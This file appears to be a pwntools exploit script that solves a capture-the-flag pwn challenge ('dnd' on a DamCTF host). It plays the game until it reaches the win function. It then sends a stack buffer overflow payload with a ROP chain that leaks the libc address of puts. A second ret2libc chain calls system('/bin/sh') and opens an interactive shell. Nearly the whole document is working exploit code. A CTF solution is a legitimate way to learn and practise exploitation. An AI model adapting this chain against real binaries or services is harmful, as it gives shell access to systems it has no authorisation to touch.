#!/usr/bin/env python3

from pwn import *
from Crypto.Util.number import bytes_to_long
import sys


exe = ELF("./dnd_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# context.log_level = "debug"

pop_rdi_rbp_ret = 0x0000000000402640   # Got it using ropper tool

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("dnd.chals.damctf.xyz", 30813)

    return r

def reach_win(r):
    try:
        for i in range(6):
            data = r.recvuntil("? ")
            if b"Congratulations!" in data:
                break
            r.sendline("a")
    except:
        sys.exit("We didn't win\nPlease run the script again : (")


def leak_puts_and_retwin(r):

    payload = flat(
    "A" * 104,
    pop_rdi_rbp_ret,
    p64(exe.got["puts"]),
    "B" * 8,
    p64(exe.plt["puts"]),
    p64(exe.symbols["_Z3winv"])
    )

    r.sendline(payload)
    r.recvline() # Receving the win function banner

    # Parsing puts address from little endian
    puts_leak = r.recvline().strip()
    puts_leak = bytes_to_long(puts_leak[::-1])
    print(r.recvuntil(", fierce warrior?"))

    return puts_leak

def ret2libc(r):
    # Get the gadgets from the libc
    libc_ROP = ROP(libc)
    # pop_rdi_rbp = libc_ROP.find_gadget(["pop rdi"])[0]  # we already have this gadget from the binary : )
    pop_rsi_rbx = libc_ROP.find_gadget(["pop rsi"])[0]
    pop_rdx = libc_ROP.find_gadget(["pop rdx"])[0]

    # Classic ret2libc payload
    payload2 = flat(
        "A" * 104,
        p64(pop_rdi_rbp_ret),
        p64(next(libc.search("/bin/sh\0"))),  # RDI value (first argument to system) -> pointer to /bin/sh string
        p64(0), # RBP value -> any (Just a gadget side effect)
        p64(pop_rsi_rbx),
        p64(0), # RSI value (second argument to system) -> 0
        "B"*8, # RBX  value -> any (Just a gadget side effect)
        p64(pop_rdx),
        p64(0), # RDX value (third argument to system) -> 0
        p64(libc.symbols["system"])

    )
    r.sendline(payload2)


def main():
    r = conn()
    # GDB script to break point at return instruction
    # gdb.attach(r,"""
    # b * win + +243
    # c
    # """)

    # Attacking until win : D
    reach_win(r)
    
    # First payload to exploit BOF and leak puts function address then return to win again
    puts_leak = leak_puts_and_retwin(r)

    # Set the libc base
    libc.address = puts_leak - libc.symbols["puts"]
    print(hex(libc.address))

    # Do the ret2libc attack
    ret2libc(r)
    r.interactive()


if __name__ == "__main__":
    main()
